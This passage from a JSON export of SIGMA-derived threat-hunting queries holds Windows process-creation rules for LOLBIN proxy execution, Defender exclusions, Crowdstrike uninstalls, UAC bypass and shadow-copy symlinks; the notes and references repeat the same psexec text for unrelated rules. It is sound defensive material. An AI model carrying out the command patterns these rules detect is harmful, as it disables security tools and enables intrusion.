contains \"\u27bf\" or tgt.process.cmdline contains \"\ud83d\udd1a\" or tgt.process.cmdline contains \"\ud83d\udd19\" or tgt.process.cmdline contains \"\ud83d\udd1b\" or tgt.process.cmdline contains \"\ud83d\udd1d\" or tgt.process.cmdline contains \"\ud83d\udd1c\" or tgt.process.cmdline contains \"\u2714\ufe0f\" or tgt.process.cmdline contains \"\u2611\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd18\" or tgt.process.cmdline contains \"\ud83d\udd34\" or tgt.process.cmdline contains \"\ud83d\udfe0\" or tgt.process.cmdline contains \"\ud83d\udfe1\" or tgt.process.cmdline contains \"\ud83d\udfe2\" or tgt.process.cmdline contains \"\ud83d\udd35\" or tgt.process.cmdline contains \"\ud83d\udfe3\" or tgt.process.cmdline contains \"\u26ab\ufe0f\" or tgt.process.cmdline contains \"\u26aa\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udfe4\" or tgt.process.cmdline contains \"\ud83d\udd3a\" or tgt.process.cmdline contains \"\ud83d\udd3b\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 905
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of \"provlaunch.exe\" which might indicate potential abuse to proxy execution.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Provlaunch.EXE Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\provlaunch.exe\" and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \":\\PerfLogs\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \"\\AppData\\Temp\\\" or tgt.process.image.path contains \"\\Windows\\System32\\Tasks\\\" or tgt.process.image.path contains \"\\Windows\\Tasks\\\" or tgt.process.image.path contains \"\\Windows\\Temp\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 906
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of MeshAgent to execute commands on the target host, particularly when threat actors might abuse it to execute commands directly.\nMeshAgent can execute commands on the target host by leveraging win-console to obscure their activities and win-dispatcher to run malicious code through IPC with child processes.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - MeshAgent Command Execution via MeshCentral",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\meshagent.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 907
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Extract data from cab file and hide it in an alternate data stream",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Suspicious Extrac32 Alternate Data Stream Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"extrac32.exe\" and tgt.process.cmdline contains \".cab\") and tgt.process.cmdline matches \":[^\\\\\\\\]\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 908
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child process of Setres.EXE.\nSetres.EXE is a Windows server only process and tool that can be used to set the screen resolution.\nIt can potentially be abused in order to launch any arbitrary file with a name containing the word \"choice\" from the current execution path.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "Uncommon Child Process Of Setres.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\setres.exe\" and tgt.process.image.path contains \"\\choice\") and (not (tgt.process.image.path contains \"C:\\Windows\\System32\\choice.exe\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\choice.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 909
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the Microsoft signed script \"CL_mutexverifiers\" to proxy the execution of additional PowerShell script commands",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Potential Script Proxy Execution Via CL_Mutexverifiers.ps1",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and tgt.process.image.path contains \"\\powershell.exe\" and tgt.process.cmdline contains \" -nologo -windowstyle minimized -file \") and (tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\Windows\\Temp\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 910
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential abuse of the provisioning registry key for indirect command execution through \"Provlaunch.exe\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential Provisioning Registry Key Abuse For Binary Proxy Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"SOFTWARE\\Microsoft\\Provisioning\\Commands\\\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 911
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the Dinject PowerShell cradle based on the specific flags",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "HackTool - DInjector PowerShell Cradle Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" /am51\" and tgt.process.cmdline contains \" /password\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 912
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects possible payload obfuscation via the commandline",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potential Dosfuscation Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"^^\" or tgt.process.cmdline contains \"^|^\" or tgt.process.cmdline contains \",;,\" or tgt.process.cmdline contains \";;;;\" or tgt.process.cmdline contains \";; ;;\" or tgt.process.cmdline contains \"(,(,\" or tgt.process.cmdline contains \"%COMSPEC:~\" or tgt.process.cmdline contains \" c^m^d\" or tgt.process.cmdline contains \"^c^m^d\" or tgt.process.cmdline contains \" c^md\" or tgt.process.cmdline contains \" cm^d\" or tgt.process.cmdline contains \"^cm^d\" or tgt.process.cmdline contains \" s^et \" or tgt.process.cmdline contains \" s^e^t \" or tgt.process.cmdline contains \" se^t \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 913
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of Gpg4win to encrypt/decrypt files located in potentially suspicious locations.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "File Encryption/Decryption Via Gpg4win From Suspicious Locations",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\gpg.exe\" or tgt.process.image.path contains \"\\gpg2.exe\") or tgt.process.displayName=\"GNU Privacy Guard (GnuPG)\" or tgt.process.displayName=\"GnuPG\u2019s OpenPGP tool\") and tgt.process.cmdline contains \"-passphrase\" and (tgt.process.cmdline contains \":\\PerfLogs\\\" or tgt.process.cmdline contains \":\\Temp\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 914
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Powershell Defender Exclusion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Add-MpPreference \" or tgt.process.cmdline contains \"Set-MpPreference \") and (tgt.process.cmdline contains \" -ExclusionPath \" or tgt.process.cmdline contains \" -ExclusionExtension \" or tgt.process.cmdline contains \" -ExclusionProcess \" or tgt.process.cmdline contains \" -ExclusionIpAddress \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 915
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a signed binary dropped by Kaspersky Lab Products Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands and binaries.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Kavremover Dropped Binary LOLBIN Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" run run-cmd \" and (not (src.process.image.path contains \"\\cleanapi.exe\" or src.process.image.path contains \"\\kavremover.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 916
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Shadow Copies storage symbolic link creation using operating systems utilities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003",
                "t1003"
            ],
            "name": "VolumeShadowCopy Symlink Creation Via Mklink",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"mklink\" and tgt.process.cmdline contains \"HarddiskVolumeShadowCopy\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 917
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548",
                "t1218"
            ],
            "name": "CMSTP UAC Bypass via COM Object Access",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\DllHost.exe\" and (src.process.cmdline contains \" /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\" or src.process.cmdline contains \" /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F}\" or src.process.cmdline contains \" /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41}\" or src.process.cmdline contains \" /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}\" or src.process.cmdline contains \" /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}\") and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 918
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Uninstall Crowdstrike Falcon Sensor",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\WindowsSensor.exe\" and tgt.process.cmdline contains \" /uninstall\" and tgt.process.cmdline contains \" /quiet\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 919
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of GfxDownloadWrapper.exe with a URL as an argument to download file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Arbitrary File Download Via GfxDownloadWrapper.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\GfxDownloadWrapper.exe\" and (tgt.process.cmdline contains \"http://\" or tgt.process.cmdline contains \"https://\")) and (not tgt.process.cmdline contains \"https://gameplayapi.intel.com/\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 920
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of X509Enrollment",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1553"
            ],
            "name": "Suspicious X509Enrollment - Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"X509Enrollment.CBinaryConverter\" or tgt.process.cmdline contains \"884e2002-217d-11da-b2a4-000e7bbb2b09\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 921
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) from non default locations as seen with bumblebee activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Wab Execution From Non Default Location",
